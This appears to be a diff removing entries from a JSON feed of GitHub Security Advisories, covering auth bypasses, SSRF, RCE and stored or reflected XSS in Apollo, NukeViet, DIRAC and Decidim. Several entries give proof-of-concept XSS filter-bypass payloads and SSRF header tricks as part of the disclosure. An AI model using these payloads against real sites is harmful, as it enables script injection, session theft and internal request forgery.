-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-61667"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-59955",
-      "title": "Apollo ConfigService access key authentication bypass via raw config file appId parsing",
-      "summary": "### Summary\nApollo ConfigService may allow unauthorized access to raw configuration data when AccessKey / management key authentication is enabled because authentication parsed the appId incorrectly for the raw config file endpoint.\n\n### Details\nRequests under /configfiles/raw/{appId}/{clusterName}/{namespace} were parsed for authentication as appId \"raw\" instead of the actual path appId. ConfigService used the parsed appId to look up available AccessKey secrets before verifying the request signature.\n\nIf no AccessKey is configured for an application literally named \"raw\", ConfigService may treat the request as having no available secrets and allow it to continue without signature verification, even when AccessKey / management key authentication is enabled for the actual target appId in the path.\n\n### Impact\nAn unauthenticated remote attacker may read raw configuration data from affected ConfigService endpoints when AccessKey / management key authentication is enabled for the target app and the attacker requests the raw config file endpoint.\n\n### Affected endpoints\nThe primary impact is on ConfigService raw config file reads under /configfiles/raw/{appId}/{clusterName}/{namespace}.\n\n### Status\nFixed in Apollo 2.5.2. Users should upgrade to Apollo 2.5.2 or later.\n\n### Related advisory\nThe non-canonical appId matching issue is tracked separately in GHSA-4w3q-qpfq-v992 so each independently fixable vulnerability can receive its own CVE.",
-      "link": "https://github.com/advisories/GHSA-h4pc-58cc-hc95",
-      "published": "2026-07-13T18:37:14Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-59955"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-59954",
-      "title": "Apollo ConfigService access key authentication bypass via appId parsing and non-canonical matching",
-      "summary": "### Summary\nApollo ConfigService may allow unauthorized access to configuration data when AccessKey / management key authentication is enabled and ConfigService accepts a non-canonical appId variant during authentication while downstream request handling resolves it to the protected app.\n\n### Details\nConfigService extracts appId from configuration and notification requests and uses the extracted value to look up available AccessKey secrets. If the extracted appId is a non-canonical variant that does not exactly match the AccessKey cache key, ConfigService may treat the request as having no available secrets and allow it to continue without signature verification.\n\nThis can happen when downstream release lookup still matches the real appId under database collations that treat the values as equivalent. Examples include accent variants under accent-insensitive collations, or trailing-space variants under PAD SPACE collations.\n\n### Impact\nAn unauthenticated remote attacker may read configuration data from affected ConfigService endpoints when AccessKey / management key authentication is enabled for the target app and the deployment database collation treats a non-canonical appId variant as equivalent to the real appId.\n\n### Affected endpoints\nThe primary impact is on ConfigService configuration read endpoints under /configs and /configfiles. Notification endpoints using appId parameters are also hardened as defense-in-depth.\n\n### Status\nFixed in Apollo 2.5.2. Users should upgrade to Apollo 2.5.2 or later.\n\n### Related advisory\nThe raw config file endpoint parsing issue originally described in this advisory has been split into GHSA-h4pc-58cc-hc95 so each independently fixable vulnerability can receive its own CVE.",
-      "link": "https://github.com/advisories/GHSA-4w3q-qpfq-v992",
-      "published": "2026-07-13T18:26:30Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-59954"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-55372",
-      "title": "NukeViet: Pre-authentication SSRF via X-Forwarded-Host",
-      "summary": "## Summary\n\nAn unauthenticated attacker can coerce the server into issuing HTTP requests to an attacker-chosen host by spoofing the `X Forwarded-Host` (and `X-Forwarded-Proto`) request headers. The forwarded host is used, without validation, to build the URL that `server_info_update()` fetches with cURL, resulting in a Server-Side Request Forgery (SSRF) that requires no authentication.\n\n## Affected component\n\n- File: `includes/ini.php` \u2014 function `server_info_update()` (cURL sink)\n- File: `vendor/vinades/nukeviet/Core/Server.php` \u2014 `standardizeHost()` and the forwarded-header handling in the constructor (source of the tainted host)\n- Trigger: `POST` request containing the field `__serverInfoUpdate=1`, handled early in `includes/ini.php` before any authentication.\n\n## Details\n\n`NukeViet\\Core\\Server` derives `original_host` / `original_protocol` from the `X-Forwarded-Host` / `X-Forwarded-Proto` headers and exposes them via `getOriginalHost()` / `getOriginalProtocol()`. These values are attacker-controlled and were not validated against the site's configured domains (`my_domains`).\n\nIn `server_info_update()` the tainted host and scheme are concatenated directly into a cURL URL:\n\n```php\n$proto = $nv_Server->getOriginalProtocol();   // from X-Forwarded-Proto\n$host  = $nv_Server->getOriginalHost();        // from X-Forwarded-Host\n$ch = curl_init($proto . '://' . $host . NV_BASE_SITEURL . 'index.php?response_headers_detect=1');\ncurl_exec($ch);\n```\n\nTwo factors made this reliably reachable:\n\n1. The `__serverInfoUpdate` handler runs very early in `includes/ini.php`, before authentication, so the sink is reachable pre-auth.\n2. The host sanitiser `standardizeHost()` stripped a trailing port only with the regex `(\\:[0-9]+)$`, which is bypassed by appending a slash (e.g. `127.0.0.1:8081/`): the string no longer ends in `:digits`, so the port survives and an arbitrary `host:port` reaches the cURL call.\n\n## Proof of Concept\n\n```http\nPOST /index.php HTTP/1.1\nHost: <victim>\nX-Forwar",
-      "link": "https://github.com/advisories/GHSA-4chg-4752-w88r",
-      "published": "2026-07-13T17:58:44Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-55372"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54064",
-      "title": "NukeViet: Multiple Anti-XSS Filter Bypasses Leading to Stored XSS in News Module",
-      "summary": "## Summary\n\nTwo filter-bypass techniques in `NukeViet\\Core\\Request::filterAttr()` and `NukeViet\\Core\\Request::unhtmlentities()` allow a low-privileged user (any account with news post permission) to store and serve arbitrary JavaScript to any visitor of the affected page.\n\n## Affected Component\n\n`vendor/vinades/nukeviet/Core/Request.php` \u2014 class `NukeViet\\Core\\Request`\n\n## Vulnerability Details\n\n### Bypass 1 \u2014 Form Feed character prefix (`\\x0C`) before event handler name\n\nThe `filterAttr()` method blocks event-handler attributes using:\n```php\npreg_match('/^on/i', $attrSubSet[0])\n```\nPHP's `trim()` does **not** strip the ASCII Form Feed character (`\\x0C`, U+000C). An attacker can prefix the attribute name with `\\x0C` so that `\\x0Conerror` does not match `/^on/`. The HTML5 browser parser treats `\\x0C` as a valid whitespace separator and correctly activates the event handler.\n\n**Proof-of-concept payload (URL-encoded POST body field `bodyhtml`):**\n```\n<img src=\"x\" %0Conerror=\"alert('XSS')\">\n```\n\n### Bypass 2 \u2014 Decimal HTML entity tab (`&#9;`) inside `javascript:` URI\n\n`unhtmlentities()` strips the hex-encoded tab `&#x09;` via `str_ireplace`, but did **not** strip its decimal equivalent `&#9;`. The keyword-blocking regex `/j\\s*a\\s*v\\s*a\\s*s\\s*c\\s*r\\s*i\\s*p\\s*t/si` uses `\\s*` which does not match HTML entities. The value `jav&#9;ascript:alert()` passes the filter, is stored in the database, and is decoded by the browser into a working `javascript:` URI.\n\n**Proof-of-concept payload (inside a Markdown-style link):**\n```\n[Click me](jav&#9;ascript:alert('XSS'))\n```\n\n## Impact\n\nAn authenticated attacker with news-posting permission can inject persistent JavaScript that executes in the browser of **any user** (including administrators) who views the affected article. This enables session cookie theft, credential harvesting, defacement, and further privilege escalation.\n\n## Patches\n\nFixed in commit `<commit-sha>` by modifying `vendor/vinades/nukeviet/Core/Request.php`:\n\n1. **`fi",
-      "link": "https://github.com/advisories/GHSA-465g-4q99-5x86",
-      "published": "2026-07-13T17:54:08Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54064"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-49259",
-      "title": "NukeViet: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
-      "summary": "## Summary\n\nA stored cross-site scripting (XSS) vulnerability exists in NukeViet CMS versions 4.x through 4.5.08. A low-privileged authenticated user can store a JavaScript payload in their profile's display name fields. The payload executes in the browser of any visitor \u2014 including administrators \u2014 who clicks the **Reply** (\"Answer\") link on a comment posted by that user.\n\n## Affected Component\n\nThe `{COMMENT.post_name}` template variable is interpolated without JavaScript-context escaping into an inline `onclick` handler in both comment block positions:\n\n- `themes/default/modules/comment/comment.tpl` line 27 (top-level comments)\n- `themes/default/modules/comment/comment.tpl` line 64 (nested/reply comments)\n\n```html\nonclick=\"nv_commment_feedback(event, {COMMENT.cid}, '{COMMENT.post_name}')\"\n```\n\n## Root Cause\n\nThe `first_name` and `last_name` profile fields are sanitized with HTML numeric character references (`'` \u2192 `&#039;`, `(` \u2192 `&#40;`, `)` \u2192 `&#41;`, `/` \u2192 `&#x002F;`) via `Request::_get_title()` with `$specialchars = true`. This encoding is correct for plain HTML attribute and element contexts, but **insufficient for a JavaScript string literal embedded inside an HTML attribute**.\n\nBrowsers decode HTML entities in attribute values **before** the JavaScript engine parses the string. As a result, `&#039;` is decoded back to `'`, which terminates the JS string early and allows the remainder of the value to be executed as JavaScript.\n\nThe combined display name (`nv_show_name_user(first_name, last_name)`) is what reaches the template, giving an attacker up to ~200 encoded characters across both fields \u2014 sufficient for any practical payload.\n\n## Proof of Concept\n\nSet `first_name` to the following value in profile settings (`/index.php?nv=users&op=editinfo`), then post any comment:\n\n```text\na');alert(document.domain);//\n```\n\nThe value is stored as `a&#039;&#41;;alert&#40;document.domain&#41;;&#x002F;&#x002F;`.\n\nWhen a visitor clicks the Reply link on the comment, the",
-      "link": "https://github.com/advisories/GHSA-w2w5-w2pw-r929",
-      "published": "2026-07-13T17:22:26Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-49259"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48118",
-      "title": "NukeViet: Unauthenticated Reflected XSS in Comment Module",
-      "summary": "## Summary\n\nReflected XSS in the Comment module via the `status_comment` URL parameter. The parameter accepts attacker-controlled base64-encoded HTML/JavaScript that is decoded server-side and rendered unescaped into the page. Compounded by a second flaw: the `checkss` anti-forgery token was derived from a site-wide static value (`NV_CACHE_PREFIX`) instead of a per-session value, making the token reusable across all users and allowing the attack to be delivered via a simple crafted URL.\n\n## Details\n\n### Vulnerability 1 \u2014 Reflected XSS via `status_comment`\n\n**Affected components:**\n- `modules/comment/funcs/main.php` \u2014 parameter ingestion\n- `modules/comment/comment.php` \u2014 decode and template assignment\n- `themes/*/modules/comment/comment.tpl` \u2014 raw render\n\nThe `status_comment` GET/POST parameter is sanitised with `get_title()`, which applies `strip_tags()`. Because the parameter is intended to carry a base64-encoded string, its character set (`[A-Za-z0-9-_,]`) passes through `strip_tags()` unchanged. The value is later decoded with `nv_base64_decode()` and assigned to the template variable `STATUS_COMMENT` **without any escaping**, which the template then renders raw inside a `<div>`.\n\nThe fundamental flaw is ordering: the filter is applied to the **encoded form** of the data, before decoding, so it is entirely ineffective against whatever the decoded content contains. Any HTML or JavaScript payload, once base64-encoded, survives the filter and executes in the victim's browser.\n\n### Vulnerability 2 \u2014 Session-independent `checkss` token\n\n**Affected components:**\n- `modules/comment/comment.php` \u2014 token validation in comment-load and comment-module functions\n- `modules/comment/funcs/post.php` \u2014 token validation when posting\n- All caller modules that generate a `checkss` before invoking the comment system (e.g. `modules/news`, `modules/page`)\n\nThe `checkss` token required to load the comment block was computed by hashing the resource parameters together with `NV_CACHE_PRE",
-      "link": "https://github.com/advisories/GHSA-mxpf-qgg6-v3ff",
-      "published": "2026-07-13T17:21:07Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48118"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45579",
-      "title": "DIRAC is vulnerable to RCE in RequestManager due to eval on untrusted input",
-      "summary": "### Summary\nAn remote code execution vulnerability exists in RequestManager due to the use of eval on untrusted input that allows any authenticated user to run code/commands on the DIRAC server as the system user running the DIRAC services.\n\n### Details\nThe export_getRequestCountersWeb function is callable by any authenticated user and just passes its parameters directly to the database instance:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/RequestManagementSystem/Service/ReqManagerHandler.py#L270\n\nIf the groupingAttribute string is unrecognised, `Request.` is prepended to it and the result is passed into an `eval()` call:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/RequestManagementSystem/DB/RequestDB.py#L766-L776\n\nBy passing in a dunder string that is applicable to the Request object, it's possible to work back up to functions in the os module and trigger them to be called in the server context.\n\nThere are other uses of eval in ReqManager/RequestDB which may be equally accessible.\n\n### Impact\nThis allows any authenticated user to run commands on the server, which allows a full compromise of the DIRAC system (they can read the local dirac.cfg, get database passwords and export all stored proxies and tokens). If local logging is used, they can also remove evidence of the exploit from the log (it leaves an exception printout in the RequestManager log when used).\n\n### Patched versions:\nhttps://pypi.org/project/DIRAC/8.0.79/\nhttps://pypi.org/project/DIRAC/9.0.22/\nhttps://pypi.org/project/DIRAC/9.1.10/",
-      "link": "https://github.com/advisories/GHSA-9jpv-c7p4-997x",
-      "published": "2026-07-13T17:20:18Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45579"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45573",
-      "title": "Decidim: Push subscriptions can be abused for server-side requests",
-      "summary": "## Description\n\nThe push-subscription endpoint stores an attacker-controlled delivery URL, and the notification send path becomes an outbound-request sink when VAPID delivery is enabled. The practical result is an authenticated, stored, mostly blind SSRF primitive to arbitrary HTTPS endpoints reachable from the app server.\n\n## Technical description\n \nWhen VAPID delivery is enabled, the notification subscription flow stores the client-supplied push endpoint without checking that it belongs to an approved push service. The send path later passes that stored URL to `WebPush.payload_send`, turning the subscription into an attacker-controlled outbound request destination.\nThis is the source-to-sink chain:\n\n1. Source: attacker-controlled `subscription.endpoint` in the JSON body posted to `POST /notifications_subscriptions`.\n2. Persistence: `params[:endpoint]` is stored under `user.notification_settings[\"subscriptions\"]`.\n3. Retrieval: `user.notifications_subscriptions.values` returns that stored endpoint later.\n4. Sink: `build_payload` sets `endpoint: subscription[\"endpoint\"]`.\n5. Outbound request: `WebPush.payload_send(**payload)` uses the attacker-supplied endpoint as the\ndestination.\n\nOne spec asserts that the endpoint is persisted exactly as supplied:\n\n```ruby\n# decidim-core/spec/services/decidim/notifications_subscriptions_persistor_spec.rb\nexpect(user.notifications_subscriptions[\"auth_code_121\"][\"endpoint\"]).to eq(params[:endpoint])\n```\n\nAnother spec asserts that `SendPushNotification` passes the stored endpoint into `WebPush.payload_send`:\n\n```ruby\n# decidim-core/spec/services/decidim/send_push_notification_spec.rb\nfirst_notification_payload = {\n  message:,\n  endpoint: subscriptions[\"auth_key_1\"][\"endpoint\"],\n  p256dh: subscriptions[\"auth_key_1\"][\"p256dh\"],\n  auth: subscriptions[\"auth_key_1\"][\"auth\"],\n  vapid: a_hash_including(...)\n}\nexpect(WebPush).to receive(:payload_send).with(first_notification_payload)\n```\n\n### Impact\n\n- In a configured deployment, an authenti",
-      "link": "https://github.com/advisories/GHSA-2g9c-vf8h-prxx",
-      "published": "2026-07-13T17:19:17Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45573"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45414",
-      "title": "Decidim: JWT-backed authentication can be replayed across organizations",
-      "summary": "## Description\n\nA JWT issued to an Org 1 account is accepted on the Org 2 API and can read the admin-only GraphQL `participantDetails` field for an Org 2 participant. The same trust-boundary problem also affects API-user authentication: an Org 1 API user can use a JWT on the Org 1 host and replay that JWT to the Org 2 API to read Org 2 participant personal data and reach Org 2's `proposal.answer` mutation path.\n\n##  Technical description\n\nThe current host selects the Decidim organization context, but JWT-backed API authentication is not sufficiently bound to\nthat host organization. As a result, the API can process a request in Org 2's context while still trusting an authenticated\nprincipal from Org 1.\n\nReproduction steps:\n\n1. Use an API key provided by the system administrator that is assigned to organization 1 to create the JWT token or\nget the JWT token shown in the response when logged in as the organization admin.\n\n<img width=\"1080\" height=\"1119\" alt=\"decidim-jwt-01\" src=\"https://github.com/user-attachments/assets/6195a250-faef-41d5-8f64-4d77d4077e96\" />\n\n\n2. When using this JWT token it is possible to retrieve details from other organisations. Notice the change of the host header in the request below to that of another tenant `org2.localhost:3001`\n \n<img width=\"1085\" height=\"1047\" alt=\"decidim-jwt-02\" src=\"https://github.com/user-attachments/assets/d40825e3-0d36-44f3-bede-86d247bbe6d0\" />\n\nNote that using a participant-generated JWT did not allow showing these results.\n\n### Impact\n\nA JWT issued for one organization can be replayed successfully against another organization's API and used to retrieve sensitive details from that organization.\n\n### Patches\n\nSee https://github.com/decidim/decidim/pull/16673 and https://github.com/decidim/decidim/pull/16756\n\n### Workarounds\n\nDisable JWT credentials on system panel (`/system`) \n\n### References\n\nOWASP A01:2021 Broken Access Control\n\n### Credits\n\nThis issue was discovered in a security audit organized by the [Decidim As",
-      "link": "https://github.com/advisories/GHSA-r3v7-5x4c-c69q",
-      "published": "2026-07-13T17:16:56Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45414"
       ],
       "is_zero_day": false,
       "is_high_severity": true
